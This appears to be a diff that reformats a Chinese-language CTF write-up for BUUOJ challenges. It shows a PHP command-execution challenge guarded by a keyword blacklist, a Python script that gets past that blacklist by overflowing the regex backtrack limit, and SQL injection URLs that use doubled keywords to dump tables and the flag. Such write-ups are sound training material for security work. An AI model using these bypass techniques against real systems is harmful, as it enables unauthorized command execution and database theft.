@@ -41,7 +41,29 @@ rce的点，进入之后先针对于提示将get参数传递为json格式
 **题目有源码**
 
 ```php
-<?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) {    $json = $_REQUEST['cmd'];    if (!is_string($json)) {        echo 'Hacking attempt detected<br/><br/>';    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {        echo 'Hacking attempt detected<br/><br/>';    } else {        echo 'Attempting to run command:<br/>';        $cmd = json_decode($json, true)['cmd'];        if ($cmd !== NULL) {            system($cmd);        } else {            echo 'Invalid input';        }        echo '<br/><br/>';    }}?>
+<?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd']))
+{
+    $json = $_REQUEST['cmd'];
+    if (!is_string($json))
+    {
+        echo 'Hacking attempt detected<br/><br/>';
+    }
+    elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json))
+    {
+        echo 'Hacking attempt detected<br/><br/>';
+    }
+    else {
+        echo 'Attempting to run command:<br/>';
+        $cmd = json_decode($json, true)['cmd'];
+        if ($cmd !== NULL)
+        {
+            system($cmd);
+        }
+        else {
+            echo 'Invalid input';
+        }
+        echo '<br/><br/>';
+    }}?>
 ```
 
 1.  is\_string()  
@@ -67,7 +89,8 @@ rce的点，进入之后先针对于提示将get参数传递为json格式
 查看flag的位置过程不做赘述，直接是ls 查看home就可以。
 
 ```shell
-import requestsurl='http://5dd96313-13f8-4eb6-89eb-0dbb5a4ba30a.node3.buuoj.cn'data={    'cmd':'{"cmd":"/bin/cat /home/rceservice/flag","123":"'+'b'*1000000+'"}'}# 由于我们是把json解码成为数组,因此可以看到我们需要保留cmd方便读取，我们另外在加一个123来增加长度。r=requests.post(url=url,data=data).textprint(r)
+import requestsurl='http://5dd96313-13f8-4eb6-89eb-0dbb5a4ba30a.node3.buuoj.cn'data={
+    'cmd':'{"cmd":"/bin/cat /home/rceservice/flag","123":"'+'b'*1000000+'"}'}# 由于我们是把json解码成为数组,因此可以看到我们需要保留cmd方便读取，我们另外在加一个123来增加长度。r=requests.post(url=url,data=data).textprint(r)
 ```
 
 ##### [](#0a "%0a")%0a
@@ -93,10 +116,13 @@ import requestsurl='http://5dd96313-13f8-4eb6-89eb-0dbb5a4ba30a.node3.buuoj.cn'd
 
 ```shell
  http://b1cafe94-d5ee-4133-96ff-e61ebb12b891.node5.buuoj.cn:81/check.php?username=admin&password=a'ororderder bbyy 5--+http://b1cafe94-d5ee-4133-96ff-e61ebb12b891.node5.buuoj.cn:81/check.php?username=admin'ANANDD Extractvalue(1,concat('~',()))--+&password=a
+
 ```
 
 利用报错注入
 
 ```shell
-# 拿到表http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(table_name)%20FRFROMOM%20infoORrmation_schema.tables%20WHWHEREERE%20table_schema%20=%20%27geek%27--+b4bsql,geekuse# 拿到列http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(column_name) FRfromOM infoorrmation_schema.columns WHEwhereRE table_name = 'b4bsql' --+id username passwordhttp://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(id,username,passwoorrd) FRfromOM b4bsql --+直接拿到flag1cl4yi_want_to_play_2077,2sqlsql_injection_is_so_fun,3porndo_you_know_pornhub,4gitgithub_is_different_from_pornhub,5Stopyou_found_flag_so_stop,6badguyi_told_you_to_stop,7hackerhack_by_cl4y,8flagflag{900b1ab5-4178-41c5-83ba-b3773993ede1}
+# 拿到表http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(table_name)%20FRFROMOM%20infoORrmation_schema.tables%20WHWHEREERE%20table_schema%20=%20%27geek%27--+b4bsql,geekuse# 拿到列http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(column_name)
+FRfromOM infoorrmation_schema.columns WHEwhereRE table_name = 'b4bsql' --+id username passwordhttp://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(id,username,passwoorrd)
+FRfromOM b4bsql --+直接拿到flag1cl4yi_want_to_play_2077,2sqlsql_injection_is_so_fun,3porndo_you_know_pornhub,4gitgithub_is_different_from_pornhub,5Stopyou_found_flag_so_stop,6badguyi_told_you_to_stop,7hackerhack_by_cl4y,8flagflag{900b1ab5-4178-41c5-83ba-b3773993ede1}
 ```
